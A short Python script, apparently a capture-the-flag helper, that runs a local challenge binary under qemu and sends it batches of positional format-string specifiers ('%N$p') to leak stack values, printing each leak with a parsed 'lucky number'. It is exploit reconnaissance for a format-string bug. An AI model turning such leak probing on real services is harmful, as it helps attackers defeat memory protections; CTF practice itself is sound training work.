#!/usr/bin/env python3
import subprocess, sys, re
CHAL='chal'
LD='/usr/x86_64-linux-gnu/lib/ld-linux-x86-64.so.2'
LIB='/usr/x86_64-linux-gnu/lib'

def run(idx, f1, f2='B'):
    inp=(idx+'\n'+f1+'\n'+f2+'\n').encode('latin1')
    p=subprocess.run(['qemu-x86_64-static',LD,'--library-path',LIB,CHAL],
                     input=inp,capture_output=True,timeout=20)
    o=p.stdout.decode('latin1')
    m=re.search(r'Your lucky number is 0x([0-9a-f]+)',o)
    lk=int(m.group(1),16) if m else None
    # echo output is everything after 'Echoed output: '
    i=o.find('Echoed output: ')
    return lk, o[i+len('Echoed output: '):] if i>=0 else o

# arg indices: non-positional %p consumes sequentially from arg1
start=int(sys.argv[1]); end=int(sys.argv[2])
for n in range(start,end+1,5):
    grp=list(range(n,min(n+5,end+1)))
    fmt=''.join('%%%d$p'%g for g in grp)
    lk,out=run('1',fmt)
    print('args %s: %s   (leak byte=%s)'%(grp,out.strip(),hex(lk) if lk else None))
